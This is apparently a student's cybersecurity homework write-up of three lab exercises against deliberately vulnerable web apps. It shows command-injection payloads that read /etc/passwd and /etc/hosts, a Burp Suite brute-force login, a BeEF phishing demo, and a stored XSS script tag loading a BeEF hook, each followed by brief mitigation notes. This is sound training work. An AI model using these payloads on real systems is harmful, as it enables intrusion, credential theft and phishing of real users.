# Unit 15 Homework Submission

### Web Application 1: *Your Wish is My Command Injection*

1. Complete the following to set up the activity. 

    - Start Terminal and run `cd Documents/web-vulns && docker-compose up`

    - Navigate to the following webpage: <http://192.168.13.25> and select the **Command Injection** option.
    
      - The web page should look like the following:

        ![DVWA Code Injection](https://github.com/naseebahikram/Homework-15/blob/main/Homework%2015%20Pictures/DVWA%20Code%20Injection.PNG)


2. This page is a new web application built by Replicants in order to enable their customers to `ping` an IP address. The web page will return the results of the ping command back to the user.

    - Complete the following steps to walkthrough the intended purpose of the web application. 

      - Test the webpage by entering the IP address `8.8.8.8`. Press Submit to see the results display on the web application.

        ![DVWA Ping 8.8.8.8](https://github.com/naseebahikram/Homework-15/blob/main/Homework%2015%20Pictures/DVWA%20Ping%208.8.8.8.PNG)

     - This process is no different than if we went to the command line and typed that same command: `ping 8.8.8.8`

        ![Terminal Ping 8.8.8.8](https://github.com/naseebahikram/Homework-15/blob/main/Homework%2015%20Pictures/Terminal%20Ping%208.8.8.8.PNG)

3. Test if we can manipulate the input to cause an unintended result.

    - On the same webpage, enter the following command (payload) in the field: `8.8.8.8 && pwd`

    - This command uses two ampersands to add a second command to the original request:

      - Terminal `ping 8.8.8.8 && pwd`: 

        ![Terminal ping & pwd](https://github.com/naseebahikram/Homework-15/blob/main/Homework%2015%20Pictures/Terminal%20Ping%208.8.8.8-pwd.PNG)
  
      - DVWA `8.8.8.8 && pwd`:

        ![DVWA ping & pwd](https://github.com/naseebahikram/Homework-15/blob/main/Homework%2015%20Pictures/DVWA%20Ping%208.8.8.8.-pwd.PNG)


4. Now that you have determined that Replicants new application is vulnerable to command injection, you are tasked with using the dot-dot-slash method to design two payloads that will display the contents of the following files:
   
    - DVWA `8.8.8.8 && cat /../etc/passwd`:
      
        ![DVWA ping & cat](https://github.com/naseebahikram/Homework-15/blob/main/Homework%2015%20Pictures/DVWA%20ping-passwd.PNG)
    
    - Terminal `ping 8.8.8.8 && cat /../etc/passwd`:

        ![Terminal ping & cat](https://github.com/naseebahikram/Homework-15/blob/main/Homework%2015%20Pictures/Terminal%20Ping-passwd.PNG)

    - DVWA `8.8.8.8 && cat /../etc/hosts`:

        ![DVWA ping & cat](https://github.com/naseebahikram/Homework-15/blob/main/Homework%2015%20Pictures/DVWA%20ping-hosts.PNG)

    - Terminal `ping 8.8.8.8 && cat /../etc/hosts`:

        ![Terminal ping & cat](https://github.com/naseebahikram/Homework-15/blob/main/Homework%2015%20Pictures/Terminal%20ping-hosts.PNG)
  

5. **Deliverable**: Take a screen shot confirming that this exploit was successfully executed and provide 2-3 sentences outlining mitigation strategies. 

  - Run with restricted permissions
    - This will reduce the number of users that can access the database. It will also secure the location of all the confidential files and directories. 
  - Don't use command line calls if possoble
    - Use APIs whenever possible

### Web Application 2: *A Brute Force to Be Reckoned With*

1. Complete the following steps to set up the activity. 

    - Open a terminal and run `sudo burpsuite`
    
    - Open a browser on Vagrant and navigate to the webpage <http://192.168.13.35/login.php>.
  
    -  The page should look like the following:

      - Login: `bee`

      - Password: `bug`

    - This will take you to the following page:

      ![bWAPP login](https://github.com/naseebahikram/Homework-15/blob/main/Homework%2015%20Pictures/bWAPP%20login.PNG)

    - To access the application where we will perform our activity, enter in the following URL: <http://192.168.13.35/ba_insecure_login_1.php>

      - This will take you to the following page:

        ![bWAPP Broken Auth](https://github.com/naseebahikram/Homework-15/blob/main/Homework%2015%20Pictures/bWAPP%20Broken%20Auth..PNG)

        ![BurpSuite Interception](https://github.com/naseebahikram/Homework-15/blob/main/Homework%2015%20Pictures/BurpSuite%20Intercept.PNG)

        ![Cluster Bomb](https://github.com/naseebahikram/Homework-15/blob/main/Homework%2015%20Pictures/Clusterbomb.PNG)

        ![Payload 1](https://github.com/naseebahikram/Homework-15/blob/main/Homework%2015%20Pictures/payload%201.PNG)

        ![Payload 2](https://github.com/naseebahikram/Homework-15/blob/main/Homework%2015%20Pictures/Payload%202.PNG)

        ![Successful Login](https://github.com/naseebahikram/Homework-15/blob/main/Homework%2015%20Pictures/Successful%20Burp%20Suite.PNG)

 
4. **Deliverable**: Take a screen shot confirming that this exploit was successfully executed and provide 2-3 sentences outlining mitigation strategies. 

  - Locking accounts after a fixed number of failed attempts
  - Lock out IP-Addresses if there are multiple login attemps
  - Complex usernames and passwords 

### Web Application 3: *Where's the BeEF?*

1. Complete the following to set up the activity. 

   - When you ran `docker-compose up`, you also brought up a containerized instance of the BeEF Framework. 
   
   - To access the BeEF User Interface (UI), navigate to `http://127.0.0.1:3000/ui/panel`.

   - When the BeEF webpage opens, login with the following credentials:
     - Username: `beef`
     
     - Password: `feeb`

     ![wd_hw11](https://github.com/naseebahikram/Homework-15/blob/main/Homework%2015%20Pictures/Beef%20Login.PNG)

2. The Browser Exploitation Framework (BeEF) is a practical client-side attack tool that exploits vulnerabilities of web browsers to assess the security posture of a target.      

   - While BeEF was developed for lawful research and penetration testing, criminal hackers leverage it as an attack tool.
  
   - An attacker takes a small snippet of code, called a BeEF Hook, and determines a way to add this code into a target website. This is commonly done by cross-site scripting.

   - When subsequent users access the infected website, the users' browsers become *hooked*.
     - Once a browser is hooked, it is referred to as a **zombie**. A zombie is an infected browser that awaits instructions from the BeEF control panel.
     - The BeEF control panel has hundreds of exploits that can be launch against the *hooked* victims, including:
       - Social engineering attacks 
       - Stealing confidential data from the victim's machine
       - Accessing system and network information from the victim's machine
       
3. BeEF includes a feature to test out a simulation of an infected website.
    
    - To access this simulated infected website, locate the following sentence on the BeEF control panel: `To begin with, you can point a browser towards the basic demo page here, or the advanced version here.`

    - This will open the following website, which has been infected with a BeEF hook.

       ![wd_hw14](https://github.com/naseebahikram/Homework-15/blob/main/Homework%2015%20Pictures/Beef%20Hook.PNG)

4. Now we are ready to test an exploit.

    - Select the Commands tabs. 
    
      - This will list folders of hundreds of exploits that can be ran against the hooked browser. Note that many may not work, as they are dependent on the browser and security settings enabled.
  
   - First, we'll attempt a social engineering phishing exploit to create a fake Google login pop up. We can use this to capture user credentials.
     
   - To access this exploit, select Google Phishing under Social Engineering.

   - After selecting this option, the description of the exploit and any dependencies or options are displayed in the panel on the right.

       ![wd_hw17](https://github.com/naseebahikram/Homework-15/blob/main/Homework%2015%20Pictures/Google%20Phishing.PNG)

   - To launch the exploit, select Execute in the bottom right corner.

     - After selecting Execute, return back to your browser that was displaying the Butcher Shop website. Note that it has been changed to a Google login page.

     - A victim could easily mistake this for a real login prompt.

   - Lets see what would happen if a victim entered in their credentials. Use the following credentials to login in to the fake Google page. 
     - Username: `hackeruser`
     - Password: `hackerpass`

       ![wd_hw18](https://github.com/naseebahikram/Homework-15/blob/main/Homework%2015%20Pictures/Beef%20Google.PNG)



5. Now that you know how to use the BeEF tool, you'll use it to test the Replicants web application. You are tasked with using a stored XSS attack to inject a BeEF hook into Replicants' main website.

   - Task details:
     - The page you will test is the Replicants Stored XSS application which was used the first day of this unit: `http://192.168.13.25/vulnerabilities/xss_s/`
     - The BeEF hook, which was returned after running `docker-compose up` was: `http://127.0.0.1:3000/hook.js`
     - The payload to inject with this BeEF hook is: `<script src="http://127.0.0.1:3000/hook.js"></script>`

   -  When you attempt to inject this payload,  you will encounter a client-side limitation that will not allow you to enter the whole payload. You will need to find away around this limitation.    
      
      ![HW_15](https://github.com/naseebahikram/Homework-15/blob/main/Homework%2015%20Pictures/Changing%20Max%20Length.PNG)
    
   - Once you are able to hook into Replicants website, attempt a couple BeEF exploits. Some that work well include:
     
     - Social Engineering >> Pretty Theft

      ![hw](https://github.com/naseebahikram/Homework-15/blob/main/Homework%2015%20Pictures/Petty%20Theft.PNG)

     - Social Engineering >> Fake Notification Bar

      ![hw](https://github.com/naseebahikram/Homework-15/blob/main/Homework%2015%20Pictures/Notification%20Bar.PNG)

     - Host >> Get Geolocation (Third Party)

      ![hw](https://github.com/naseebahikram/Homework-15/blob/main/Homework%2015%20Pictures/Geolocation.PNG)

6. **Deliverable**: Take a screen shot confirming that this exploit was successfully executed and provide 2-3 sentences outlining mitigation strategies. 
  - Change passwords regularly
  - Keeping systems up to date
  - Restoring VM's on a regular basis
